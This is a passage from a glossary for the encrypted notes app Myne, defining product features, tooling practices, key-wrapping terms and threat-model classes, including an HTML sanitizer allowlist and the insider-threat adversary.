Used in: `threat-model.md` §1 (A10 discussion)

### **embed layout segment** &nbsp; 📦 *Product* *(Myne-divergent: yes; keyed segments, and `align=` has no Obsidian counterpart)*

An author's size, alignment or alt-text choice for one embedded attachment, written as an extra **keyed** segment on the form-C [attachment embed](#attachment-embed) (`![[att:<id>|photo.png|w=300|align=center|alt=A sunset]]`; `spec/wikilink.md` §2 form 12 / §5.1, myne#409). The closed vocabulary is `w` (`1..8192` px or `1..100%`), `h` (`1..8192` px), `align` (`left`/`center`/`right`) and `alt` (free text). Three rules bind: **segment 1 is always the filename**, and from segment 2 on an unkeyed segment rejoins it with its `|` (an attachment filename may itself contain a pipe, so a positional reading would corrupt notes already on disk); **`alt=` is terminal**, swallowing the rest of the embed so alt prose may contain pipes, with an authored-EMPTY `alt=` meaning a deliberately decorative image; and an unreadable segment is **dropped without rewriting the note's bytes**, reported to the author when a known key carried a bad value and passed over silently when the key itself is unknown (an unknown key is a newer client's choice read by an older one, not an error the reader can act on). A width is a **maximum intent**: render clamps it to the editor's content column, which is itself a user preference. Segments are never typed, because the embed is atomic and never source-lifts. There are two authoring paths, both of which write through the same one function: the embed's overflow menu (the size presets, a custom size prompt, the alignment and alt rows), and dragging the resize handles on a [block-drawn](#attachment-embed) embed, which writes `w=` from the right edge and `w=` plus `h=` from the corner grip (myne-md/myne#604). On an attachments-included export a pixel `w` becomes Obsidian's own `|300` / `|300x200` spelling and the rest travels through; `align` is a Myne extension Obsidian has no core syntax for.

Used in: `spec/wikilink.md` §2, §5.1; `spec/markdown-dialect.md` §6, §7; `decisions.md` 2026-08-15

### **embedded HTML rendering** &nbsp; 📦 *Product*

The editor's rendering of a curated safe subset of note-authored raw HTML (MYND-209): inline `<kbd>`/`<mark>`/`<sub>`/`<sup>`/`<abbr title>` and block `<p>`/`<details>`/`<summary>`. The raw span is sanitized through DOMPurify (lazy-loaded) under an ultra-tight allowlist (8 tags, `title`-only) and rendered via `innerHTML` of the **sanitized output only** — the SYNC-5 trusted-input boundary. Off-allowlist tags (`<script>`/`<iframe>`/`<img>`) and HTML inside code are not rendered (stay plain text). `<details>` is natively interactive with open/closed in a WebView-only map (never the buffer, §6 C1). Supersedes the prior "raw HTML → plain monospace, no XSS surface" posture (`markdown-dialect.md` §8; `decisions.md` 2026-06-08).

Used in: `spec/markdown-dialect.md` §3.1/§8, `threat-model.md` §6

### **callout (admonition)** &nbsp; 📦 *Product*

A `> [!TYPE]` blockquote rendered as a styled container with a colored tint, icon, and title (MYND-47) — the GitHub/Obsidian admonition convention. `src/editor/decorations/callout.ts` promotes the blockquote via a separate cursor-aware layer that composes with `blockquote.ts` (does not modify it); the Obsidian-full ~12-type set is case-insensitive and maps to the existing semantic color tokens + a local icon set. Custom title supported; unknown type → plain blockquote; `[!TYPE]` bytes preserved, revealed on-cursor (§6 C1). A `/callout` slash command emits `> [!note] ` (§5). The interactive fold (`+`/`-`) marker is recognized + round-trips but the collapse toggle is a follow-up.

Used in: `spec/markdown-dialect.md` §5/§7

### **emoji shortcode** &nbsp; 📦 *Product*

A `:name:` token (e.g. `:rocket:`) the editor renders as the corresponding unicode emoji glyph (MYND-156). The `@lezer/markdown` Emoji config tags the token; a lazy-loaded name→glyph map (`src/dialect/emoji-shortcodes.ts`, code-split per SYNC-4) resolves mapped names, leaving unmapped ones as literal text. The `:` autocomplete inserts the unicode glyph directly (not the `:shortcode:`), so authoring emits a plain char. The source `:name:` is render-only — never rewritten in the buffer (§6 C1).

Used in: `spec/markdown-dialect.md` §3.2

### **highlight (markdown)** &nbsp; 📦 *Product*

The `==text==` inline construct, rendered with a muted warm-amber `--highlight` wash (MYND-156). The one hand-rolled `MarkdownConfig` in Myne's dialect (`@lezer/markdown` ships sub/sup/emoji but no highlight). Cursor-aware: the `==` markers hide off-cursor and reveal on-cursor; bytes preserved (§6 C1). Has a canonical emit form via the highlight selection-toolbar button (§5). The `.cm-highlight` class is shared with the embedded-HTML `<mark>` element render (SYNC-6). `==text==` is always the **default yellow**; non-yellow highlights use [multi-color highlight](#multi-color-highlight) instead.

Used in: `spec/markdown-dialect.md` §3.2, §5

### **move verb** &nbsp; 📦 *Product*

The [agentic note editing](#agentic-note-editing) verb that changes which folder a note is in, taking a note id and a destination folder (`myne-md/myne#848`). It exists because the alternative was the edit path: the model proposed folder moves through an anchored edit, the [folder lock](#folder-lock) refused them, and the run's own summary still reported the moves as applied. As a verb, the destination is its own field, so the review can render where the note would land and the clamp can read it before the write. It is a [proposed edit](#proposed-edit) like any other and writes nothing until approved.

Used in: `decisions/ai/0662`

### **motion tier** &nbsp; 📦 *Product*

One of the two named levels of permitted animation (`design-notes/ui/0632`): **restrained** (the default, and the only tier a decoration may use) and **expressive** (an interaction that is itself the feedback, named per use in `PRODUCT.md` principle 4). The tier is declared in the DOM as `data-motion="restrained" | "expressive"`, and `scripts/check-motion-canon.mjs` fails any `infinite` animation that is not on its named allowlist. `prefers-reduced-motion` zeroes transitions in BOTH tiers; only a `data-motion="essential"` indeterminate-progress indicator is exempt, and it slows rather than stops.

Used in: `design-notes/ui/0632`; `PRODUCT.md` principle 4; `scripts/check-motion-canon.mjs`

### **multi-color highlight** &nbsp; 📦 *Product*

A 5-color highlight palette — yellow (default), green, blue, pink, purple — usable within a single note (decisions.md 2026-06-15). Because `==text==` carries no color, a non-yellow highlight is stored as the portable [embedded HTML](#embedded-html-rendering) form `<mark class="hl-green|hl-blue|hl-pink|hl-purple">text</mark>` (the toolbar's color swatches emit it; yellow keeps emitting `==text==`). The `hl-*` class set is **closed** and enforced at the DOMPurify boundary (`ALLOWED_ATTR` widened to `[title, class]`, then an `uponSanitizeAttribute` hook keeps `class` only as one allowlisted token on a `<mark>`); an unknown/multi-class value is stripped and falls back to the default-yellow `<mark>` render, with note bytes preserved verbatim (§6 C1). Not Pandoc attribute syntax (§7 still excludes that) — a fixed closed vocabulary, not general `.class` parsing. The per-color washes are the `--highlight-{green,blue,pink,purple}` tokens.

Used in: `spec/markdown-dialect.md` §3.2, §5, §7, §8


### **hosted sync** &nbsp; 📦 *Product*

The convenience-paid tier in Myne's freemium model. Myne-operated zero-knowledge sync server (Phase 2+); identical protocol-level guarantees to a self-hosted instance. Status in v0.1: not yet shipped.

Used in: `vision.md`, `decisions.md`

### **hide vault names** &nbsp; 📦 *Product*

The device-wide option that keeps vault names off the locked [vault picker](#vault-picker). Off by default since myne-md/myne#411, which reversed the 2026-06-09 "no plaintext label is ever written at rest" clause as a product call. It lives in Settings under Privacy and is deliberately **not** gated by `developer_mode`, because the person who most needs it has to be able to find it before a first unlock ever caches a name. Enabling it destroys every per-vault [sealed label store](#sealed-label-store) key and removes every such file, which is cryptographic erase rather than a rewrite, and stops future writes. Disabling it again resurrects nothing: names reappear one at a time as each vault is unlocked. Four limits are recorded in `threat-model.md` §7 rather than left to be discovered: the erase cannot reach a full-system snapshot taken while names were enabled; a rename leaves the old name on this account's other devices until each unlocks that vault; the picker is a pre-unlock surface, so no key destruction un-shows a name an observer at a locked screen has already read, and only enabling the option before a first unlock keeps one from being cached at all; and the flag itself is a device-local plaintext file, so a disk-write adversary can revert the suppression, though not the erase it already performed.

Used in: `threat-model.md` §7; `decisions.md` 2026-08-15

### **image OCR** &nbsp; 🏗️ *Construction*

The on-device optical-character-recognition generation of [attachment text extraction](#attachment-text-extraction) (MYND-441, [extractor version](#extractor-version) `0x03`): raster image attachments (PNG / JPEG / WebP) and scanned, text-layer-less PDFs become searchable by the words in their pixels. A three-model pipeline — text-region detection, 0°/180° line-orientation classification, then CTC recognition — runs on a pure-Rust ML runtime over weights **bundled with the app** (never side-loaded, never downloaded; the runtime has no network surface). A scanned PDF needs no rasterizer: the page image it already embeds is pulled out of the PDF object stream and recognized directly.

Deliberately **not** an AI feature and **not** behind the AI opt-in — it is search correctness, and gating a background indexer behind a beta toggle would mean it effectively never ran. It therefore ships in every build, including the `--no-default-features` auditable one.

Two limits are honest, measured properties rather than bugs. **Turkish diacritics do not survive reliably** — no available on-device model reproduces them, so the search index carries a diacritic-folded token variant for attachment documents to compensate; the *stored* text is whatever OCR produced. And recognition below a per-word confidence floor is discarded, so an image with no readable text is cached as empty rather than indexed with hallucinated words. (`spec/protocol.md` §9.15; MYND-441)

### **ignored invariant test** &nbsp; 🛠️ *Tooling*

A test that asserts the **invariant a fix must establish**, carries `#[ignore = "unfixed: … see <issue>"]`, and is therefore **red today**. `cargo test` stays green; `cargo test -- --ignored <name>` is the standing record of what is not yet fixed, and the day the fix lands the test is un-ignored and goes green.

It is the third shape in a family of three, and the other two are not interchangeable with it:

- A **regression test** asserts the invariant and **runs**, so it is red before a fix and green after. That direction is why it can be trusted to stay.
- A **characterisation test** asserts the code's **current** behaviour, so it is **green while the defect lives** and goes **red the moment someone fixes it**. A red suite then reads like a regression, and the person who fixed the defect concludes they broke something. A characterisation test that ships therefore asserts the defect is *correct*, and every fix is gated on rewriting the test that documents it.
- An **ignored invariant test** asserts the invariant like a regression test but does not run. It is the shape to use when the fix is NOT available in the same change.

Two rules, and the second is the one that is easy to skip:

1. **Prefer fixing the defect.** If the fix is available in the same change, the test should be an ordinary red-then-green regression test.
2. **When the fix is not available, assert the invariant anyway and mark it `#[ignore]` with a reason naming a tracking issue that is OPEN.** The reason naming an issue that has since closed is the failure mode: on merge the record points at a closed issue and the test reads as an oversight rather than a deferral.

Two things an ignored invariant test does not give you, and both have to be supplied separately:

- **The count rots.** Nothing checks how many there are, so an entry that says "two tests, both red today" is a hand-maintained claim. `scripts/check-ignored-tests.mjs` holds the count and the open-issue requirement for `core/`.
- **A right direction is not a working fixture.** A test whose fixture cannot reach the defective state passes with the defect present, and reads as rigor. Injection is the only thing that tells them apart: apply the fix, confirm the test turns red, restore. A test that was *supposed* to discriminate and does not is worse than one that was only ever documentation, because the documentation is now false in the direction that looks like coverage.

Run one with `cargo test -p <crate> -- --ignored <name>`.

Used in: `core/src/inference/chatml.rs`, `core/src/plugins/vault_migrate/mod.rs`, `scripts/check-ignored-tests.mjs`; `design-notes/security/0614-unfixed-security-findings-ship-as-ignored-invariant-tests.md`; myne-md/myne#760, myne-md/myne#759

### **in-note find** &nbsp; 📦 *Product*

The editor's Cmd/Ctrl+F find bar (MYND-175): a **literal, single-document** search over the one open note's decrypted CodeMirror doc text — exact substring, case-fold toggle, no regex — with all-match highlighting, next/prev navigation (Enter / Shift+Enter, wrapping), and a live "k/N" count. Built on the `@codemirror/search` engine with a Myne-token *docked* panel (not the stock widget); the WebView's native Cmd/Ctrl+F is suppressed app-wide. **Deliberately distinct from the [search index](#search-index)**: that is the stemmed, BM25-ranked, Rust-side *cross-note* surface ("which notes relate to this term"); in-note find is the unranked literal *locate* tool ("exactly where in the note I'm reading"). The count is a read-only projection over the engine's match set (never a filter); matches inside folded tables/code are counted and un-fold on navigation, while a frontmatter match is counted but not raw-revealed (always-on Properties widget). The query + match cache are **WebView-only, never persisted**, released on the lock-time reload — best-effort (V8 strings can't be zeroized; AS1-dominated), **not** "zeroize-on-lock" (which is the Rust-side index). See also [search index](#search-index) (`decisions.md` 2026-05-31).

**Two literal passes since myne-md/myne#609, not one.** A task chip prints its `due` and `remind` dates in the reader's chosen date format while the document holds `YYYY-MM-DD`, and CodeMirror's search reads the document rather than the DOM, so a reader typing what is on screen found nothing. When the typed query matches nothing AND reads back as a date under that reader's own format, the bar runs a SECOND literal search for the stored form and says in the bar which text produced the matches. Literal FIRST, so a date written as ordinary prose still matches as itself; the second pass gets a turn only when the first found nothing. Still **no regex**, and that is the load-bearing half rather than a detail: an alternation would need `literal: false`, which routes REPLACE through regular-expression substitution and its dollar-sequence expansion. **Replace is disabled while the fallback produced the matches**, because the matched bytes are the stored form and a replacement typed in the reader's format would leave a value `parseTaskInstant` refuses, dropping the task out of every dated view. The gate is a predicate at the decision point, consulted by the buttons AND by the replace field's Enter handler; a version that disabled only the buttons left the keyboard path open (`decisions.md` 2026-08-29).

Used in: `decisions.md` 2026-05-31, `decisions.md` 2026-08-29

### **in-transit encryption** &nbsp; 🏗️ *Construction*

TLS with a verified certificate chain and server name. Native sync clients use a bundled public CA root store; the browser client uses its browser's trust store. Neither pins a leaf certificate or asks the user to enter its fingerprint (`decisions/sync/0620`, `threat-model.md` A4/TB4). Non-loopback sync endpoints require HTTPS; loopback HTTP remains a local-development exception. Transport encryption is distinct from the note encryption performed before transmission.

Used in: `threat-model.md` §3 TB4

### **ingest-time image compression** &nbsp; 🏗️ *Construction*

The one-way downscale-and-re-encode applied to a raster image **as it is imported** as an attachment, governed by the `attachment_compression_enabled` preference (`spec/protocol.md` §9.5.2, default **on**). Three rules run in order over a bounded decode: cap the long edge at the display ceiling; re-encode a lossless source to lossless WebP with no size floor; re-encode a JPEG lossily above a byte floor. The transform sits **between the content-type sniff and the content-addressed id computation**, so the attachment id, the dedup check, the stored blob and the catalog `size` all derive from the final bytes — dedup, the fail-closed GC, sync, backup and export need no knowledge that compression happened (`spec/protocol.md` §9.9/§9.10).

**Irreversible, and that is the design rather than a limitation**: the original bytes are not retained, because a retained original is a second stored blob and a second synced object — it would raise the two costs the feature exists to lower. The obligation that creates is met by a **notice at import** reporting the before and after sizes, not by a consent gate; a per-image confirmation was weighed and rejected as friction on the most common action in the app. Four rails bound the one-way-ness: the stored bytes are whichever of {original, processed} is smaller, so it is never a size downgrade; every failure path (undecodable bytes, unsupported format, encode failure, decode-limits violation) stores the original and the import still succeeds; SVG and animated GIF are excluded by rule and never decoded; and an explicit `image::Limits` dimension check runs **before allocation**, since compression makes every imported image an untrusted decode.

Deliberately **not** classified like its neighbours. [image OCR](#image-ocr), on-device AI and spell-check are device-local compute-budget switches whose effects are local and reversible; this is a content-fidelity switch whose effect is vault-wide and irreversible, so it is **shared** in the sync merge (scalar-LWW, `spec/sync-protocol.md` §10.2) — a switch must have the same reach as the effect it controls. Applies to **future** imports only; existing attachments are never read, rewritten, or re-referenced (`decisions.md` 2026-07-30).

Used in: `spec/protocol.md` §9.5.2, `spec/sync-protocol.md` §10.2, `decisions.md` 2026-07-30

### **IP-scrubbing proxy** &nbsp; 🏗️ *Construction*

The self-host bundle's TLS edge (a vetted Caddy reverse proxy) configured to **delete every client-IP-bearing field** from its access log (`remote_ip`, `client_ip`, `X-Forwarded-For`, `X-Real-Ip`, `Forwarded`). Caddy's *default* access log emits the client IP, so the scrub is explicit and load-bearing: it enforces the no-persistent-IP-logging commitment (C4/AS14) at the **edge**, complementing the app's in-process `noIP` middleware (defense in depth). An operator who fronts the bundle with their own load balancer inherits the obligation to scrub the IP there. Phase 2.

Used in: `self-host-policy.md` §3, `decisions.md` 2026-06-20 (MYND-438)

### **inline status mark** &nbsp; 📦 *Product*

A named icon that sits **inside a text run** to say what a surface owes: the trailing slot of a sidebar note row, the bottom bar beside the save readout. It is a distinct class from an ordinary **icon**, which names a thing, and `docs/design/README.md` carves two of the icon rules out for it rather than bending them: it is drawn at 12px rather than 16 and up, because at 16 in a row's trailing slot it reads as a badge attached to the note rather than as a mark on it; and it is coloured by MEANING (`--accent` while work is in flight, `--fg-3` while it is merely outstanding) rather than by `currentColor`.

The class used to carve out a third rule, hand-drawn geometry at 7 to 8px, on the argument that no Lucide pair distinguishes a filled dot from a hollow one at that size. The premise held and the conclusion did not: what shipped under it was a three-quarter ring that read as a stalled spinner, and then a solid triangle that read as a bullet point down a column of rows. The answer to "no glyph is legible at 7px" is not a cleverer glyph but a larger one (myne-md/myne#603).

Two rules govern which mark is which. **One shape per fact**: two facts may not share a glyph, which is the report that created this class in the first place. **Motion is a state, never a shape**: rotation is shown only for work that ends, and two states are never told apart by rotation alone, since a distinction visible only to someone watching the screen is not a distinction.

A mark is never a live region. It has no text content, so `role="status"` on it announces nothing, and the surface renders a persistently-mounted visually-hidden region beside it instead.

Used in: `docs/design/README.md` (Iconography), `src/components/Spinner.tsx` (`StatusMark`)

### **inline tag** &nbsp; 📦 *Product*

A `#`-prefixed identifier appearing inside note body text (as opposed to the YAML `tags:` frontmatter list). Recognized by the Myne dialect per `spec/markdown-dialect.md` §3.7. Boundary: line-start or whitespace must precede the `#`; `abc#tag` does not match. Character set: Unicode (excluding the General/Supplemental Punctuation blocks and an explicit ASCII-punctuation set). Numeric-only forms (`#1984`) reject; `#y1984` accepts. Nested forms via `/` (`#parent/child`) supported with unbounded depth. The parser only recognizes; never rewrites — byte-stability per §6 C1 extends to inline-tag bytes. Tag identity (case-fold, NFC normalization) is the consuming index layer's responsibility, not the parser's.

Used in: `spec/markdown-dialect.md` §3.7, §6 C1

### **insider threat** &nbsp; ⚠️ *Threat*

Adversary class A11: a Myne team member acting maliciously. The architecture grants the team no privileged read access — keys never leave the client. The single privileged asset is the release-signing key (TB8), the offline minisign key that signs each release's hash list, together with the Android release keystore; compromise reduces to A9 (compromised distribution). There is no desktop code-signing key, which is a gap rather than a reassurance.

Used in: `threat-model.md` §1 (A11)

### **import-&-convert** &nbsp; 📦 *Product*

The explicit, byte-change-visible command that turns an imported filename-only image reference (`![[image.png]]`, `![alt](path)`) into a real vault [attachment](#attachment): it resolves the source file (auto-resolve, picker fallback), imports it via [attachment_import](#attachment_import), mints the [attachment-id](#attachment-id), and rewrites the reference to the form-C embed `![[att:<id>|filename]]` — with a mandatory diff-preview before commit (parallel to the wikilink R2 conversion command, `spec/wikilink.md` §189). No silent name-match; without invoking it, imported references stay an unrendered chip (byte-preservation, `spec/markdown-dialect.md` C1). (MYND-164)

### **import adapter** &nbsp; 📦 *Product*

A per-source reader that turns one external note format into Myne-dialect markdown for the [import source](#import-source) seam, so the shared ingest path needs no knowledge of the format. v1 ships four beyond the original Obsidian reader — Evernote (`.enex`), generic HTML, Notion (unzipped export), and CSV (importer-breadth epic, MYND-312). Every adapter is **accepted-lossy** in the [base import](#base-import) sense: it converts the representable subset, names what it could not represent, and never silently drops content (the loss is surfaced through the [import report](#import-report)). Adapters add **no new host capability** — all four read through the existing within-root-validated importer file seam, which is why a Notion export must be unzipped by the user first rather than extracted in-app. Source names ("Notion", "Evernote", "Obsidian") are used **nominatively** only — what the adapter reads — and are never productized as Myne feature names. Apple Notes is deliberately **not** an adapter: it publishes no export artifact, and every mechanism to reach its data would need an exception to the single-external-read-path rule.

Used in: `decisions.md` 2026-07-25

### **import report** &nbsp; 📦 *Product*

An ordinary generated note listing every note that imported successfully but **lost representable detail**, each as a [wikilink](#wikilink) plus its folder path and the names of the dropped constructs. It is the disclosure mechanism for **per-element** fidelity loss, which the pre-existing per-file drop tallies cannot express: an HTML→markdown conversion that loses a callout, a toggle, and coloured text still counts as one successfully imported note, so there is no honest integer to put in a summary row. Chosen over a persisted frontmatter marker specifically to avoid a [dialect](#dialect) commitment — it introduces no value-strict field, no round-trip clause, and no new spec surface, while still surviving the import session (a modal-only list is unrecoverable once dismissed on a large import) and remaining deletable in one action. (MYND-585)

Used in: `decisions.md` 2026-07-25

### **import source** &nbsp; 🏗️ *Construction*

The two-stage seam every [import adapter](#import-adapter) implements: `plan()` enumerates item **descriptors** cheaply (never note content), and `load()` yields one item's markdown at a time. The split is load-bearing in both directions — `plan()` keeps the progress denominator determinate for every source (a bare streaming generator cannot know the total until it has finished, breaking "Importing X of N"), while `load()` preserves the serial-ingest discipline that keeps only one note's plaintext in memory at once. It is also what lets a **one-file-many-notes** source exist at all: Evernote's single `.enex` holds N notes, a shape the original directory walk could not represent. Because every source funnels through one shared ingest loop, per-note fidelity loss has exactly one collection point rather than one per adapter. (MYND-579)

Used in: `decisions.md` 2026-07-25

### **isolated note** &nbsp; 📦 *Product*

*(Alias: orphan note.)*

A note with **zero resolved cross-note wikilink edges** in the graph view, nothing links to it and it links to nothing (MYND-198 / SYNC-13). Graph-STRUCTURAL, not "no authored links": a note whose only outbound link is broken (`[[Typo]]`) is still isolated (a broken link is not an edge), and a note connected only by a shared tag is still isolated (a tag node is a HUB the graph draws in the whole-vault view, not an edge between the notes carrying it, `decisions/ui/0602`). Embed / anchor / block-ref references (`![[Note]]`, `[[Note#h]]`, `[[Note^b]]`) DO count as edges, so a note reached only by an embed is not isolated. Surfaced by the graph view's "Isolated" filter (a degree-0 index query that works at any vault size).

Used in: `vision.md` Phase 1 Scope (graph view); `decisions.md` 2026-06-08 (graph visualization)

### **item order** &nbsp; 📦 *Product*

The user's manual order across the unified sidebar file-tree, persisted as the `item_order` field of `vault.prefs`. A **container-keyed map** (MYND-596). Each key is a container path (`""` ≡ the tree root, or a canonical trailing-slash [folder](#folder) path), each value that container's children in manual order: a **sequence** of note UUIDs and full-path child folder paths, freely interleaved, discriminated by the trailing `/`. Container membership is *structural* (a note's container is its `folder:`; a folder's container is its parent path); the map supplies only the per-container rank, and each container sorts its own children (sub-folders + notes **together, freely interleaved**) by their index in that container's sequence, unlisted children falling back to recency (notes) / folded name (folders). Canonical encoding: keys NFC-normalized + lexicographically ordered; each value sequence NFC-normalized, order preserved verbatim, not sorted, not deduped; the whole map omitted-when-empty (`spec/protocol.md` §9.5.2). **Supersedes** the separate `note_order` + `folder_order` arrays of the pre-MYND-183 schema (`decisions.md` 2026-06-02, which retires the two-array model); MYND-596 in turn promoted the earlier flat sequence to this per-container map so each sibling group merges independently (per-container LWW, `sync-protocol.md` §10.2). One key outranks all of that and is **never persisted**: the [just-created pin](#just-created-pin). See also [favorites](#favorites), [PrefsView](#prefsview). (MYND-183, MYND-596)

Used in: `spec/protocol.md` §9.5.2; `decisions.md` 2026-06-02

### **just-created pin** &nbsp; 📦 *Product*

The transient sort key that puts the note a user has just created at the top of its container in the sidebar file tree, above every folder and above that container's own [item order](#item-order) sequence (myne-md/myne#654). Session state (`SidebarState.justCreatedId`), overwritten by the next create, cleared when that note is deleted, and gone with the session.

**Never written to `vault.prefs`**, and that is the definition rather than an implementation note: writing it into `item_order` would make every note ever created a permanently hand-ordered entry inside a blob re-encrypted on every write, which is the alternative the fix rejected. The drag-reorder baseline reads the pin, so the indices a drag computes match the list the user is looking at, and the pinned key is stripped from the sequence before it is persisted unless the user dragged that note themselves.

Used in: `editor/src/host/notes/itemOrder.ts` (`orderContainerChildren`'s `pinFirst`); `decisions.md` 2026-09-05

### **item_key** &nbsp; 🗝️ *Key/identifier*

The 32-byte random key that encrypts a single note's plaintext. Generated when the note is created. Stored on disk (in the note's `.myn` blob) wrapped under the singleton `itemsKey` via `enc_item_key`. The third level in Myne's three-level note-key wrapping (`spec/protocol.md` §3.3).

Used in: `spec/protocol.md` §3.3, §9.2

### **item_key_nonce** &nbsp; 🗝️ *Key/identifier*

The 192-bit random nonce used in the AEAD operation that wraps an `item_key` under `itemsKey`. Stored in the per-note blob alongside the wrapped key.

Used in: `spec/protocol.md` §9.2

### **items_key_id** &nbsp; 🗝️ *Key/identifier*

A 16-byte UUIDv7 identifying the `itemsKey` under which a given `item_key` was wrapped. In v0.1, every blob references the singleton vault `itemsKey`'s ID. The field generalizes structurally to a later version's epoch identifiers — a later-major vault would have multiple `itemsKey` rotations, each with its own ID.

Used in: `spec/protocol.md` §3.3, §9.2

### **itemsKey** &nbsp; 🗝️ *Key/identifier* (deep entry)

The persistent 32-byte symmetric key that wraps every `item_key` in a vault. Generated once at vault creation (random, from OS CSPRNG) and stored on disk as `enc_items_key` in `vault.meta`, wrapped under `itemsKey_wrap_key`. Unaffected by a master-password change: `itemsKey_wrap_key` is derived from `root_key`, which is random per vault rather than password-derived, so a password change rewrites only the password-side wrap of `root_key` and leaves `enc_items_key`, every per-note `item_key` and every note ciphertext byte-identical. A later version will rotate `itemsKey` per epoch to provide forward secrecy.

Used in: `spec/protocol.md` §3.3, §9.3

### **itemsKey_wrap_key** &nbsp; 🗝️ *Key/identifier*

The KEK derived from `root_key` via `derive_key(root_key, "myne.v0.1 itemsKey-wrap")`. Wraps the singleton `itemsKey`. The first level in Myne's three-level note-key wrapping.

Used in: `spec/protocol.md` §3.3

### **icon-only priority** &nbsp; 📦 *Product*

The appearance option that renders a task's priority as its icon alone instead of the word (Settings → Appearance, "Icon-only priority"). A display choice only: the stored [task inline field](#task-inline-field) keeps the full `priority` value, so toggling it changes no bytes in any note.

Used in: myne-md/myne#656

### **Ignore list (spell-check)** &nbsp; 📦 *Product*

The set of words the spell checker suppresses without treating as correct
elsewhere (MYND-266). v0.1 has a vault-wide ignore set, persisted (folded) in the
encrypted `vault.dictionary` blob (§9.13), plus a RAM-only "ignore this session"
set that is never written. Distinct from the **Personal dictionary**: ignoring a
word silences its squiggle; adding a word to the personal dictionary asserts it
is correctly spelled.

Used in: `spec/protocol.md` §9.13; MYND-266.

### **internationalization (i18n)** &nbsp; 🛠️ *Tooling*

The client UI localization layer, shared by desktop, web and mobile: `react-i18next` over flat-per-namespace JSON **locale catalogs**, with **English** as the source language and per-key fallback. Catalogs ship inside the build — there is no HTTP backend and no translation server, so no UI string is ever fetched from a third party. English is a static import; the other 30 catalogs are lazy chunks of the same build, one per locale, and a session loads only the active one (`decisions.md` 2026-08-03). Translations are **authored in-repo, by hand**; the self-hosted Weblate instance was retired in `decisions.md` 2026-10-03 (`design-notes/ui/0629`). Deliberately **excludes** load-bearing copy (`src/lib/load-bearing-copy.ts`) — those strings' exact wording is a privacy property and is E2E-pinned in English, so they render verbatim in every locale. Language is a device-local, pre-unlock preference (`localStorage` `myne.lang`), never `vault.prefs`.

Used in: `docs/dev/i18n.md`; `decisions.md` 2026-06-25; `src/i18n/`.

### **interval rule** &nbsp; 📦 *Product*

One of the two [recurrence rule](#recurrence-rule) families: a rule that **counts from the previous date** — plain intervals (`every 3 days`, `every month`) and weekday sets (`every monday and friday`).

***Myne-divergent* in a way worth stating: an interval rule may drift, and that is the design, not a bug.** Where the previous date has no counterpart in the target month, the occurrence **clamps** to the last valid day and the *next* step counts from the clamped date — 31 January + one month = 28 February, then 28 March. Clamping-and-drifting is the stateless option: nothing has to remember an original anchor day the file does not carry. It is acceptable precisely because the [ordinal rule](#ordinal-rule) family exists, so a user who wants "keep it on the 31st" says so directly. Compare `spec/markdown-dialect.md` §3.8.7's family table.

Used in: `spec/markdown-dialect.md` §3.8.7; `decisions.md` 2026-07-28

### **locale catalog** &nbsp; 🛠️ *Tooling*

A single language's translation file in the i18n layer: `locales/<lang>/<namespace>.json` (only namespace today: `common`). The English catalog (`locales/en/common.json`) is hand-maintained and is the runtime per-key fallback; the other 31 are **authored in-repo, by hand** — the repository owns every catalog (the self-hosted Weblate instance was retired in `design-notes/ui/0629`). The repo rule was "never hand-edit one", suspended twice for in-repo backfills (2026-08-03, 2026-08-25) and made the standing practice on 2026-08-03/2026-08-25; since 2026-10-03 it is simply the only path. New keys are added by `pnpm i18n:extract` (`i18next-cli`); each catalog carries its own **CLDR** plural categories, which are not English's. How complete each one is, is not asserted anywhere in prose: `docs/dev/i18n-coverage.md` is generated from the catalogs and gated by `scripts/check-i18n-coverage.mjs --check`, because the four documents that did carry a figure kept asserting 100% for three weeks after 215 keys had stopped being translated in every language.

Used in: `docs/dev/i18n.md`; `docs/dev/i18n-coverage.md`; `locales/`.

### **KDF (Key Derivation Function)** &nbsp; 🏗️ *Construction*

The generic class of functions that derive cryptographic keys from input keying material plus context. Myne uses two KDFs: Argon2id for password-stretching at vault unlock, HKDF-SHA-256 for fast subkey derivation post-unlock.

Used in: `spec/protocol.md` §4, §3.2

### **KDF parameters canonical encoding** &nbsp; 📋 *Protocol*

The 11-byte big-endian encoding of Myne's Argon2id parameters: `kdf_id (1 B) || kdf_m_kib (4 B) || kdf_t (4 B) || kdf_p (1 B) || argon2_version (1 B)`. Stored in `vault.meta` and bound into both wrap AADs (§3.1) so any tampering with parameters in `vault.meta` fails the AEAD tag check on the wrapped root-key copies.

Used in: `spec/protocol.md` §4.3

### **KEK (Key Encryption Key)** &nbsp; 🏗️ *Construction*

A key whose role is exclusively to encrypt other keys. Myne's `password_wrap_key`, `recovery_wrap_key`, and `itemsKey_wrap_key` are all KEKs.

Used in: `spec/protocol.md` §3

### **KEM (Key Encapsulation Mechanism)** &nbsp; 🏗️ *Construction*

The asymmetric building block of a hybrid encryption scheme. Generates a random symmetric key and an "encapsulation" of it that only the recipient's private key can decapsulate. Myne does not use KEMs in v0.1; ML-KEM-768 (the post-quantum KEM standardized as FIPS 203) is canonical in the B2B person path now (ML-KEM-768) and slated for a later major version vault-wide.

Used in: `spec/protocol.md` §11 (out of scope for v0.1)

### **key binding** &nbsp; 📦 *Product*

An association between a **chord** and a command id (hotkeys epic, MYND-304). A command may have zero, one, or several key bindings. Defaults live in the application's command registry (in code); user changes persist as overrides in the **keymap**. The effective binding is `override ?? default`.

Used in: hotkeys epic (MYND-304)

### **key-committing AEAD** &nbsp; 🏗️ *Construction*

An AEAD that commits to its key, in the sense that no two distinct keys can decrypt the same ciphertext to two valid plaintexts. Plain XChaCha20-Poly1305 is **not** key-committing; Myne achieves the property by wrapping it in CTX commitment.

Used in: `spec/protocol.md` §5.1
Reference: Chan & Rogaway 2022.

### **keep-both conflict resolution** &nbsp; 📋 *Protocol*

The Phase 2 sync resolution rule for **note bodies**: when two devices concurrently edit the same note (detected by the push compare-and-swap rejecting a stale base), **both versions are kept** — the loser is written as a conflict-marked duplicate note for the user to reconcile — rather than silently picking a last-writer-wins winner (which would destroy an edit the server can't even see, A1). The paranoid Standard-Notes posture: no silent data loss. Distinct from the **singleton** resolution (post-decrypt field/set merge per `protocol.md` §9.5.2) and the **`vault.meta`** bespoke merge (preserves the recovery-side wrapped `root_key`, §9.3). Pure LWW on bodies is forbidden. Phase 2.

Used in: `spec/sync-protocol.md` §10

### **keymap** &nbsp; 📦 *Product*

